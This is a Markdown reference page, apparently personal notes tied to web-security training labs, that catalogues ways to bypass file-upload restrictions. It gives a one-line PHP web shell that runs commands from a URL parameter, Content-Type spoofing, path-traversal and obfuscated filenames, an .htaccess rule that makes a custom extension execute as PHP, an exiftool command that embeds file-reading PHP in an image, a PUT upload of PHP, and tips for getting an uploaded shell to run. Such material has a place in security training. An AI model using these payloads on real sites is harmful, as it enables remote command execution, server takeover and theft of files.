---
layout: default
title: "File Upload Bypass"
parent: "Reference"
nav_order: 4
---

# File Upload Bypass Techniques

## Example Upload Request Structure

```http
POST /my-account/avatar HTTP/2
Host: TARGET.web-security-academy.net
Cookie: session=SESSION_TOKEN
Content-Type: multipart/form-data; boundary=---------------------------866603063390648708194728913
Content-Length: 519

-----------------------------866603063390648708194728913
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: application/x-php

<?php echo system($_GET['command']); ?>
```

---

## Bypass Techniques

### 1. Content-Type Spoofing
Change the `Content-Type` header in the request to a permitted type while keeping the PHP payload:
```
Content-Type: application/pdf
Content-Type: image/jpeg
Content-Type: image/png
```

### 2. Path Traversal in Filename
Change the `filename` to traverse directories:
```
filename="..%2fwebshell.php"
```
Instead of accessing `$URL/files/avatars/webshell.php`, access from `$URL/files/webshell.php`.

### 3. .htaccess Upload
Upload an `.htaccess` file to make the server execute arbitrary extensions as PHP:
```apache
AddType application/x-httpd-php .fart
```
Then upload `webshell.fart` and execute it.

### 4. File Extension Obfuscation
Try different extension variations — still call the file as `.php` when accessing:

| Filename | Why It Might Work |
|----------|-------------------|
| `exploit.php.jpg` | Parsed as PHP depending on algorithm |
| `exploit.php.` | Trailing `.` or spaces sometimes stripped |
| `exploit%2Ephp` | Decoded server-side only |
| `exploit.php;.jpg` | Discrepancy in what's considered the filename end |
| `exploit.php%00.jpg` | Null byte terminates string at `.php` |
| `exploit.p.phphp` | If `.php` is stripped, becomes `.php` again |

### 5. Embed PHP in EXIF Data (Image with PHP)
Use exiftool to hide PHP code inside an image file:
```bash
# Read file via PHP in EXIF comment
exiftool -Comment="<?php echo 'START' . file_get_contents('/home/user/secret') . 'END' ; ?>" image.jpg -o outfile.php
```

### 6. PUT Request Method
Some web servers support PUT for file uploads:
```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

---

## Troubleshooting: PHP Not Executing After Upload

If your PHP webshell is uploaded but renders as plain text instead of executing:

1. **PHP Tags Not Recognized** — ensure you're using `<?php` not `<?` (short tags may be disabled)
2. **Wrong File Extension** — the server won't process PHP in `.html` or `.txt` files
3. **PHP Not Installed/Enabled** — server may not have PHP configured
4. **File Permissions** — the file needs execute permissions (`644` or `755`)
5. **PHP Syntax Error** — check for syntax issues; errors before output will display as text
6. **Output Buffering** — script may buffer output and not send it to browser
7. **File Encoding** — incorrect encoding (non-UTF-8) can break PHP tags
8. **File Corruption** — binary vs text mode upload issue; re-upload
9. **Server Caching** — clear server cache; bypass with `?v=1` or similar
10. **Mixed Content Issues** — broken HTML/JS in the PHP file can prevent rendering

**Check the server error logs for clues.**
